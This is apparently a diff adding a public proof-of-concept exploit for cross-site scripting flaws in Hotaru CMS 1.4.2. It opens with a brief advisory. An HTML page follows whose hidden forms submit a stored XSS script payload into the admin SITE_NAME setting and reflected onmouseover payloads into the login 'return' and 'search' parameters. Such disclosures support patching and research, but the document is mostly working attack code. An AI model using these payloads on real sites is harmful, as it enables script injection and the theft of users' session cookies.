@@ -1,0 +1,49 @@
+source: http://www.securityfocus.com/bid/50657/info
+
+Hotaru CMS is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Hotaru CMS 1.4.2 is vulnerable; other versions may also be affected. 
+
+<html>
+<title>Hotaru CMS 1.4.2 SITE_NAME Parameter Stored XSS Vulnerability</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">
+function xss1(){document.forms["xss1"].submit();}
+function xss2(){document.forms["xss2"].submit();}
+</script><br />
+<form action="http://localhost/hotaru-1-4-2/admin_index.php?page=settings" enctype="application/x-www-form-urlencoded" method="POST" id="xss1">
+<input type="hidden" name="SITE_OPEN" value="true" />
+<input type="hidden" name="SITE_NAME" value='"><script>alert(1)</script>' />
+<input type="hidden" name="THEME" value="default/" />
+<input type="hidden" name="ADMIN_THEME" value="admin_default/" />
+<input type="hidden" name="DEBUG" value="true" />
+<input type="hidden" name="FRIENDLY_URLS" value="false" />
+<input type="hidden" name="DB_CACHE" value="false" />
+<input type="hidden" name="CSS_JS_CACHE" value="true" />
+<input type="hidden" name="HTML_CACHE" value="true" />
+<input type="hidden" name="LANG_CACHE" value="true" />
+<input type="hidden" name="RSS_CACHE" value="true" />
+<input type="hidden" name="SITE_EMAIL" value="lab@zeroscience.mk" />
+<input type="hidden" name="SMTP" value="false" />
+<input type="hidden" name="SMTP_HOST" value="mail.zeroscience.mk" />
+<input type="hidden" name="SMTP_PORT" value="25" />
+<input type="hidden" name="SMTP_USERNAME" value="" />
+<input type="hidden" name="SMTP_PASSWORD" value="" />
+<input type="hidden" name="settings_update" value="true" />
+<input type="hidden" name="csrf" value="48202665ee5176f8a813e4a865381f02" /></form>
+<a href="javascript: xss1();" style="text-decoration:none">
+<b><font color="red"><center><h3>SITE_NAME Param</h3></center></font></b></a><br />
+<form action="http://localhost/hotaru-1-4-2/index.php" enctype="application/x-www-form-urlencoded" method="POST" id="xss2">
+<input type="hidden" name="csrf" value="83405717529ac232d387c8df3cdb01d1" />
+<input type="hidden" name="page" value="login" />
+<input type="hidden" name="password" value="" />
+<input type="hidden" name="remember" value="1" />
+<input type="hidden" name="return" value="%22%20onmouseover%3dprompt%28111%29%20bad%3d%22" />
+<input type="hidden" name="username" value="" /></form>
+<a href="javascript: xss2();" style="text-decoration:none">
+<b><font color="red"><center><h3>return Param</h3></center></font></b></a><br />
+<a href="http://localhost/hotaru-1-4-2/index.php?search=%22%20onmouseover%3dprompt%28111%29%20bad%3d%22" style="text-decoration:none">
+<b><font color="red"><center><h3>search Param</h3></center></font></b></a></body>
+</html>
